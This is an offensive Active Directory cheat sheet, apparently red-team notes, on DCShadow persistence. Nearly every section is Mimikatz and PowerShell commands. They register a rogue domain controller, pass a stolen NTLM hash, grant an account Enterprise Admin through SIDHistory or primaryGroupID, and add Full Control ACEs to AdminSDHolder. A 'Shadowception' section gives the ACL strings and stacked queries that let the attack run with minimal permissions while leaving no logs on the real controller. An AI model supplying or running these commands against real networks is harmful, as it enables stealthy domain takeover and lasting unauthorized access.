# Forest Persistence - DC Shadow

DCShadow permits to create a rogue Domain Controller on a standard computer in the AD. This permits to modify objects in the AD without leaving any logs on the real Domain Controller

The compromised machine must be in the root domain on the forest, and the command must be executed as DA (or similar)

The attack needs 2 instances on the compromised machine and Mimikatz.

1) One to start RPC servers with SYSTEM privileges and specify attributes to be modified

##### With Mimikatz
##### Set SYSTEM privs to the process

    !+
    !processtoken

##### Launch the server

    lsadump::dcshadow /object:<object_to_modify> /attribute:<attribute_to_modify> /value=<value_to_set>

2) And second with enough privileges (DA or otherwise) to push the values :

        sekurlsa::pth /user:Administrator /domain:domain.local /ntlm:<hash> /impersonate
        lsadump::dcshadow /push

# Minimal Permissions

DCShadow can be used with minimal permissions by modifying ACLs of:

1) The domain object.

 - DS-Install-Replica (Add/Remove Replica in Domain)

 - DS-Replication-Manage-Topology (Manage Replication Topology)

 - DS-Replication-Synchronize (Replication Synchornization)

2) The Sites object (and its children) in the Configuration container.

 - CreateChild and DeleteChild

3) The object of the computer which is registered as a DC.

 - WriteProperty (Not Write)

4) The target object.

 - WriteProperty (Not Write)

Set-DCShadowPermissions can be used to setup automatically

#### To use DCShadow as user user1 to modify user2 object from machine machine-user1

    Set-DCShadowPermissions -FakeDC machine-user1 -SAMAccountName user2 -Username user1 -Verbose

#### Now, the second mimkatz instance (which runs as DA) is not required.

# Set Interesting Attributes

### Set SIDHistory to Enterprise Admin

    lsadump::dcshadow /object:user1 /attribute:SIDHistory /value:<domain_SID>-519

### Modify primaryGroupID

    lsadump::dcshadow /object:user1 /attribute:primaryGroupID /value:519

### Modify ntSecurityDescriptor for AdminSDHolder to add Full Control for a user

We just need to append a Full Control ACE from above for SY/BA/DA with our user's SID at the end.

#### 1) Read the current ACL of high priv groups

    (New-Object System.DirectoryServices.DirectoryEntry("LDAP://CN=AdminSDHolder,CN=System,DC=domain,DC=local")).psbase.ObjectSecurity.sddl

#### 2) Get the SID of our user and append it at the end of the ACLs. Then launch DCShadow like this :

### Set a SPN on a user

    lsadump::dcshadow /object:user1 /attribute:servicePrincipalName /value:"Legitime/User1"

# Shadowception

We can even run DCShadow from DCShadow, which is Shadowception

We need to append following ACEs with our user's SID at the end:

1) On the domain object: (OA;;CR;1131f6ac-9c07-11d1-f79f-00c04fc2dcd2;;UserSID)
(OA;;CR;9923a32a-3607-11d2-b9be-0000f87a36b2;;UserSID)
(OA;;CR;1131f6ab-9c07-11d1-f79f-00c04fc2dcd2;;UserSID)

2) On the attacker computer object: (A;;WP;;;UserSID)

3) On the target user object: (A;;WP;;;UserSID)

4) On the Sites object in Configuration container: (A;CI;CCDC;;;UserSID)

### Get the ACLs

Get the ACLs for the Domain Object :

    (New-Object System.DirectoryServices.DirectoryEntry("LDAP://DC=domain,DC=local")).psbase.ObjectSecurity.sddl

For the attacker machine:

    (New-Object System.DirectoryServices.DirectoryEntry("LDAP://CN=machine-user1,CN=Computers,DC=domain,DC=local")).psbase.ObjectSecurity.sddl

For the target user:

    (New-Object System.DirectoryServices.DirectoryEntry("LDAP://CN=user2,CN=Users,DC=domain,DC=local")).psbase.ObjectSecurity.sddl

For the Site Container:

    (New-Object System.DirectoryServices.DirectoryEntry("LDAP://CN=Sites,CN=Configuration,DC=domain,DC=local")).psbase.ObjectSecurity.sddl

### Stack the queries

After have get the ACLs and have appended the new ACEs for each one, we can stack the different queries to make a big DCShadow query

For each one :

    lsadump::dcshadow /stack /object:<object> /attribute:ntSecurityDescriptor /value:<newACL_after_the_append>

THEN

    lsadump::dcshadow

### DCShadow can now be run from a user DCShadow-ed.

